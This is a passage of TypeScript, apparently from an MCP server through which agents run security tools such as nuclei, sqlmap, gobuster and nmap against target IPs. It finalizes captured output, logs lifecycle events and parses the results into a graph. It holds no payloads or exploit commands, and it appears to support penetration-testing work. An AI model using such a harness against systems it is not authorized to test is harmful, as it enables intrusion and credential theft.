  const stderrCaptureError = finalizeResults[1].status === 'rejected'
    ? (finalizeResults[1].reason instanceof Error
        ? finalizeResults[1].reason.message
        : String(finalizeResults[1].reason))
    : (stderrSink.error()?.message);
  // If a write failed, do not claim a usable evidence_id on the event —
  // the manifest record is preserved but downstream consumers should
  // know not to trust the blob.
  const stdout_evidence_id = stdoutInfo.total > 0 && !stdoutCaptureError ? stdoutSink.evidence_id : undefined;
  const stderr_evidence_id = stderrInfo.total > 0 && !stderrCaptureError ? stderrSink.evidence_id : undefined;

  // The persistence transition is sticky for this invocation. Even if a retry
  // happens to reopen the write gate before the killed child exits, never stamp
  // a terminal event or parse/ingest output from work interrupted by degraded
  // durability. Evidence streams are closed above and the live buffer is safe
  // to finalize because both are ephemeral with respect to graph truth.
  if (executionAbort.persistenceInterrupted() || !engine.isPersistenceWritable()) {
    liveOutput.markDone(normalizedActionId);
    executionAbort.dispose();
    return persistenceInterruptedResponse(engine, normalizedActionId, {
      executed: true,
      binary,
      exit_code: result.exit_code,
      signal: result.signal,
      duration_ms: result.duration_ms,
      timed_out: result.timed_out,
      stdout: stdoutInfo.text,
      stderr: stderrInfo.text,
      stdout_truncated: stdoutInfo.truncated,
      stderr_truncated: stderrInfo.truncated,
      stdout_total_bytes: stdoutInfo.total,
      stderr_total_bytes: stderrInfo.total,
      stdout_evidence_id,
      stderr_evidence_id,
    });
  }
  // All remaining lifecycle/parser work is synchronous. Keep polling through
  // the asynchronous evidence finalization above, then release the monitor
  // only after the last point where the gate could transition between turns.
  executionAbort.dispose();

  // ---- 5. Terminal lifecycle event ----
  // Phase I: a non-zero exit no longer suppresses parsing. Tools like
  // nuclei/sqlmap/gobuster routinely return 1 to signal "no match" — the
  // captured output is still parseable. A requested parser is invoked even
  // for an empty selected stream so zero-yield execution cannot masquerade as
  // successful ingestion.
  const parseable = !result.spawn_error && (result.stdout.total_bytes > 0 || result.stderr.total_bytes > 0);
  const parserExitOk = parse_with ? isAcceptableParserExit(parse_with, result.exit_code) : true;
  // F8: when an explicit parser is supplied, let parser-aware exit handling
  // drive overall success — a known "no findings" exit (e.g. nuclei exit 1
  // with empty result set) should not surface as `action_failed`/isError:true.
  // Without `parse_with`, fall back to strict exit-code 0.
  const succeeded = !result.spawn_error && !result.timed_out && (
    parse_with ? parserExitOk : result.exit_code === 0
  );
  const partialParse = parseable && parse_with !== undefined && !parserExitOk;
  const terminalEventType = succeeded ? 'action_completed' as const : 'action_failed' as const;
  const failureReason = result.spawn_error
    ? 'spawn_error'
    : result.timed_out
      ? 'timeout'
      : !succeeded && result.exit_code !== 0
        ? 'nonzero_exit'
        : undefined;

  engine.logActionEvent({
    description: resolvedDescription,
    agent_id,
    action_id: normalizedActionId,
    event_type: terminalEventType,
    category: 'frontier',
    frontier_type: frontierType,
    tool_name,
    technique,
    command_repr,
    target_node_ids: allTargetNodeIds.length > 0 ? allTargetNodeIds : undefined,
    target_ips: targetIpsForEvents(),
    target_cidrs: targetCidrsForEvents(),
    frontier_item_id,
    result_classification: succeeded ? 'success' : 'failure',
    details: {
      exit_code: result.exit_code,
      signal: result.signal,
      duration_ms: result.duration_ms,
      timed_out: result.timed_out,
      stdout_evidence_id,
      stderr_evidence_id,
      stdout_truncated: stdoutInfo.truncated,
      stderr_truncated: stderrInfo.truncated,
      stdout_total_bytes: stdoutInfo.total,
      stderr_total_bytes: stderrInfo.total,
      stdout_dropped_bytes: result.stdout.dropped_bytes || undefined,
      stderr_dropped_bytes: result.stderr.dropped_bytes || undefined,
      evidence_capture_error: stdoutCaptureError || stderrCaptureError
        ? { stdout: stdoutCaptureError, stderr: stderrCaptureError }
        : undefined,
      spawn_error: result.spawn_error,
      reason: failureReason,
      command: command_repr,
      binary,
      args: loggedArgs,
      invoking_tool: opts.invoking_tool,
      operator_infra: operator_infra || undefined,
    },
  });
  engine.persist();
  // Live stream is finished now that the terminal event + evidence are
  // persisted; connected viewers get `action_done` and fall back to the
  // durable evidence route. The buffer self-evicts shortly after.
  liveOutput.markDone(normalizedActionId);

  // ---- 6. Optional inline parse + ingest ----
  let parse_summary: ParseIngestResult | undefined;
  if (parse_with && !result.spawn_error) {
      const fullStdoutInline = result.stdout.toFullString();
      const fullStderrInline = result.stderr.toFullString();
      const requestedStream = parse_stream ?? 'stdout';
      const streamSelectedFromInline: 'stdout' | 'stderr' | 'combined' = requestedStream === 'auto'
        ? (fullStdoutInline.trim().length > 0 ? 'stdout' : 'stderr')
        : requestedStream;
      const needsStdoutEvidence = streamSelectedFromInline === 'stdout' || streamSelectedFromInline === 'combined';
      const needsStderrEvidence = streamSelectedFromInline === 'stderr' || streamSelectedFromInline === 'combined';

      // Phase D3: when stdout was truncated by the bounded buffer but the
      // streamed evidence captured the whole thing, parse from the evidence
      // file so large outputs (nuclei/nmap/azurehound) are not silently
      // mis-parsed. If the evidence read fails for any reason, fall back to
      // the bounded inline buffer and flag the parse as partial.
      //
      // Phase E: bound the readback so a 100 MB+ scanner output can't OOM
      // the MCP server during parser ingestion. When the evidence file is
      // larger than EVIDENCE_PARSE_MAX_BYTES, fall back to a head window
      // streamed via getRawOutputHead and mark the parse as partial.
      let stdoutFromEvidence = false;
      let stderrFromEvidence = false;
      let stdoutEvidenceError: string | undefined;
      let stderrEvidenceError: string | undefined;
      let stdoutEvidenceSizeExceeded = false;
      let stderrEvidenceSizeExceeded = false;
      let fullStdout = fullStdoutInline;
      let fullStderr = fullStderrInline;
      if (needsStdoutEvidence && stdoutInfo.truncated && stdout_evidence_id) {
        try {
          const evstore = engine.getEvidenceStore();
          const onDisk = evstore.getRawOutput(stdout_evidence_id, { max_bytes: EVIDENCE_PARSE_MAX_BYTES });
          if (onDisk !== null) {
            fullStdout = onDisk;
            stdoutFromEvidence = true;
          } else {
            // Either the file is missing OR it exceeds the size cap. Try a
            // head read to see which case we're in; null again means missing.
            const head = evstore.getRawOutputHead(stdout_evidence_id, EVIDENCE_PARSE_MAX_BYTES);
            if (head === null) {
              stdoutEvidenceError = 'evidence_blob_missing';
            } else if (head.truncated) {
              fullStdout = head.text;
              stdoutFromEvidence = true;
              stdoutEvidenceSizeExceeded = true;
              stdoutEvidenceError = `evidence_too_large_for_full_parse: ${head.total_bytes} bytes (cap ${EVIDENCE_PARSE_MAX_BYTES})`;
            } else {
              fullStdout = head.text;
              stdoutFromEvidence = true;
            }
          }
        } catch (err) {
          stdoutEvidenceError = err instanceof Error ? err.message : String(err);
        }
      }
      if (needsStderrEvidence && stderrInfo.truncated && stderr_evidence_id) {
        try {
          const evstore = engine.getEvidenceStore();
          const onDisk = evstore.getRawOutput(stderr_evidence_id, { max_bytes: EVIDENCE_PARSE_MAX_BYTES });
          if (onDisk !== null) {
            fullStderr = onDisk;
            stderrFromEvidence = true;
          } else {
            const head = evstore.getRawOutputHead(stderr_evidence_id, EVIDENCE_PARSE_MAX_BYTES);
            if (head !== null) {
              fullStderr = head.text;
              stderrFromEvidence = true;
              if (head.truncated) {
                stderrEvidenceSizeExceeded = true;
                stderrEvidenceError = `evidence_too_large_for_full_parse: ${head.total_bytes} bytes (cap ${EVIDENCE_PARSE_MAX_BYTES})`;
              }
            } else {
              stderrEvidenceError = 'evidence_blob_missing';
            }
          }
        } catch (err) {
          stderrEvidenceError = err instanceof Error ? err.message : String(err);
        }
      }
      // Phase D4: choose which stream feeds the parser.
      const stream = requestedStream;
      let parserInput: string;
      switch (stream) {
        case 'stderr':
          parserInput = fullStderr;
          break;
        case 'combined':
          parserInput = fullStdout + (fullStderr ? `\n${fullStderr}` : '');
          break;
        case 'auto':
          parserInput = fullStdout.trim().length > 0 ? fullStdout : fullStderr;
          break;
        case 'stdout':
        default:
          parserInput = fullStdout;
          break;
      }
      const usedStream: 'stdout' | 'stderr' | 'combined' =
        stream === 'auto'
          ? (fullStdout.trim().length > 0 ? 'stdout' : 'stderr')
          : stream;

      // NB: parserInput is deliberately NOT scrubbed here. A secret substring
      // that collides with a parser's own control tokens (e.g. a short/numeric
      // cred_value overlapping test_webapp_credential's trailing status marker)
      // would corrupt parsing. Parsers that carry a secret (test_webapp_credential)
      // must not emit it into their finding, and the response stdout/stderr the
      // operator sees is scrubbed above — so the plaintext still can't surface.
      // Phase I/E: incomplete execution or bounded evidence produces a
      // canonical partial outcome. Completeness is recorded on the parse
      // result/event (not stamped onto canonical nodes), and the shared
      // service owns validation, ingestion, event logging, and persistence.
      const parsedFromEvidence = usedStream === 'stdout'
        ? stdoutFromEvidence
        : usedStream === 'stderr'
          ? stderrFromEvidence
          : stdoutFromEvidence || stderrFromEvidence;
      const boundedFallback = usedStream === 'stdout'
        ? stdoutInfo.truncated && !stdoutFromEvidence
        : usedStream === 'stderr'
          ? stderrInfo.truncated && !stderrFromEvidence
          : (stdoutInfo.truncated && !stdoutFromEvidence) || (stderrInfo.truncated && !stderrFromEvidence);
      const evidenceReadError = usedStream === 'stdout'
        ? stdoutEvidenceError
        : usedStream === 'stderr'
          ? stderrEvidenceError
          : [stdoutEvidenceError, stderrEvidenceError].filter(Boolean).join('; ') || undefined;
      const selectedEvidenceSizeExceeded = usedStream === 'stdout'
        ? stdoutEvidenceSizeExceeded
        : usedStream === 'stderr'
          ? stderrEvidenceSizeExceeded
          : stdoutEvidenceSizeExceeded || stderrEvidenceSizeExceeded;
      if (selectedEvidenceSizeExceeded) {
        engine.logActionEvent({
          description: 'Selected evidence stream too large for full parse — used head window',
          agent_id,
          action_id: normalizedActionId,
          event_type: 'instrumentation_warning',
          category: 'system',
          details: {
            stdout_evidence_id,
            stderr_evidence_id,
            parse_stream: usedStream,
            max_bytes: EVIDENCE_PARSE_MAX_BYTES,
            error: evidenceReadError,
          },
        });
      }
      const partialAny = partialParse || boundedFallback || selectedEvidenceSizeExceeded;
      const partialReason = partialAny
        ? (selectedEvidenceSizeExceeded
            ? 'evidence_too_large_for_full_parse'
            : partialParse && boundedFallback
              ? 'nonzero_exit_and_bounded_buffer_only'
              : partialParse
                ? 'nonzero_exit'
                : 'bounded_buffer_only')
        : undefined;

      parse_summary = parseAndMaybeIngest(engine, {
        tool_name: parse_with,
        outputText: parserInput,
        agent_id,
        action_id: normalizedActionId,
        frontier_item_id,
        context: parser_context,
        ingest: true,
        partial: partialAny,
        partial_reason: partialReason,
        parse_stream: usedStream,
        parsed_from_evidence: parsedFromEvidence,
        evidence_read_error: evidenceReadError,
        exit_code: result.exit_code,
      });
  }

  return {
    content: [{
      type: 'text',
      text: JSON.stringify({
        action_id: normalizedActionId,
        executed: true,
        binary,
        args: loggedArgs,
        exit_code: result.exit_code,
        signal: result.signal,
        duration_ms: result.duration_ms,
        timed_out: result.timed_out,
        spawn_error: result.spawn_error,
        stdout: stdoutInfo.text,
        stderr: stderrInfo.text,
        stdout_truncated: stdoutInfo.truncated,
        stderr_truncated: stderrInfo.truncated,
        stdout_total_bytes: stdoutInfo.total,
        stderr_total_bytes: stderrInfo.total,
        stdout_evidence_id,
        stderr_evidence_id,
        parse_summary,
      }, null, 2),
    }],
    isError: !succeeded || !!parse_summary?.isError,
  };
}
